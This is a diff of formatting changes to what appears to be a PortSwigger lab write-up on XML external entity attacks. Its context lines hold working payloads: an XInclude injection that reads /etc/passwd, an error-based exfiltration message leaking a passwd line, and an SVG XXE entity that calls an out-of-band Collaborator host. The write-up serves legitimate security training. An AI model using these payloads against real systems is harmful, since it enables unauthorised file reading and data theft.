@@ -501,8 +501,8 @@ Thus we can see lab is solved
   2. Constructs a dynamic URL like `/nonexistent/%file`.
   3. When this path is requested, it triggers a parsing error since `/nonexistent/` does not exist.
 - The error message reveals:
-```
 
+```
 Error: file not found: /nonexistent/root\:x:0:0\:root:/root:/bin/bash
 
 ```
@@ -574,9 +574,9 @@ POST /product/stock HTTP/2
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 ...
-
 productId=%3Cfoo+xmlns%3Axi%3D%22http%3A//www.w3.org/2001/XInclude%22%3E%3Cxi%3Ainclude+parse%3D%22text%22+href%3D%22file%3A///etc/passwd%22/%3E%3C/foo%3E&storeId=1
 ```
+
 ![image](https://github.com/user-attachments/assets/c33319fe-db5f-4c3e-8dfe-daf88d2d059e)
 
 ![image](https://github.com/user-attachments/assets/2f72dd4d-771b-4323-80ab-a420c4e68678)
@@ -641,6 +641,7 @@ Modify the request:
 - Set header: `Content-Type: image/svg+xml`
 - Payload to test DNS request:
 
+```xml
 <pre>
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://<strong>YOUR-COLLABORATOR-ID</strong>.oastify.com"&gt; ]&gt;
@@ -648,6 +649,7 @@ Modify the request:
   &lt;text&gt;&amp;xxe;&lt;/text&gt;
 &lt;/svg&gt;
 </pre>
+````
 
 ![image](https://github.com/user-attachments/assets/deb44cfb-ebcb-4184-a3e4-d3c2eb09900d)
 
@@ -708,4 +710,5 @@ Many image processing pipelines (like Batik) parse SVGs and **execute embedded X
 
 
 ---
+
 
